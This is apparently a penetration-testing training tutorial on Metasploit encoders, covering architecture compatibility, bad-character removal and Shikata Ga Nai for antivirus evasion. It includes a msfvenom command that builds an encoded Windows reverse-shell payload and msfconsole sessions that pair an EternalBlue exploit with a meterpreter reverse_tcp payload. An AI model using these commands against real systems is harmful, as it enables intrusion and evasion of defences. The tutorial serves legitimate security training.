# Encoders

---

Over the 15 years of existence of the Metasploit Framework, `Encoders` have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

|`x64`|`x86`|`sparc`|`ppc`|`mips`|
|---|---|---|---|---|
They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.

Shikata Ga Nai (`SGN`) is one of the most utilized Encoding schemes today because it is so hard to detect that payloads encoded through its mechanism are not universally undetectable anymore. Far from it. The name (`仕方がない`) means `It cannot be helped` or `Nothing can be done about it`, and rightfully so if we were reading this a few years ago. However, there are other methodologies we will explore to evade protection systems. [This article from FireEye](https://www.fireeye.com/blog/threat-research/2019/10/shikata-ga-nai-encoder-still-going-strong.html) details the why and the how of Shikata Ga Nai's previous rule over the other encoders.

## Selecting an Encoder

Before 2015, the Metasploit Framework had different submodules that took care of payloads and encoders. They were packed separately from the msfconsole script and were called `msfpayload` and `msfencode`. These two tools are located in `/usr/share/framework2/`.

If we wanted to create our custom payload, we could do so through `msfpayload`, but we would have to encode it according to the target OS architecture using `msfencode` afterward. A pipe would take the output from one command and feed it into the next, which would generate an encoded payload, ready to be sent and run on the target machine.

#### Generating Payload - With Encoding

Encoders

```shell-session
gdxqpardo@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai

Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination


```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 15

payload => windows/x64/meterpreter/reverse_tcp


msf6 exploit(windows/smb/ms17_010_eternalblue) > show encoders

Compatible Encoders
===================

   #  Name              Disclosure Date  Rank    Check  Description
   -  ----              ---------------  ----    -----  -----------
   0  generic/eicar                      manual  No     The EICAR Encoder
   1  generic/none                       manual  No     The "none" Encoder
   2  x64/xor                            manual  No     XOR Encoder
   3  x64/xor_dynamic                    manual  No     Dynamic key XOR Encoder
   4  x64/zutto_dekiru                   manual  No     Zutto Dekiru
```

In the previous example, we only see a few encoders fit for x64 systems. Like the available payloads, these are automatically filtered according to the Exploit module only to display the compatible ones. For example, let us try the `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.

```shell
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders
